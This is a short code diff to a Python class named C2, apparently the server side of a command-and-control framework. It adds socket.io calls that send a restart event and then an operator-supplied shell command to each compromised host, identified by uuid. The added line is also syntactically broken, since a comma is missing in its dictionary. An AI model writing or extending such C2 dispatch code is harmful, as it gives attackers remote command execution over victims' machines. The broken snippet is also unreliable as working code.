@@ -126,6 +126,8 @@ class C2:
         if explotation_module_type == "send-command":
             for uuid in uuids:
                 print(data['input'])
+                self.sio.emit('restart', uuid)
+                self.sio.emit('command', {"id": uuid 'cmd': data['input']})
                     
 
 
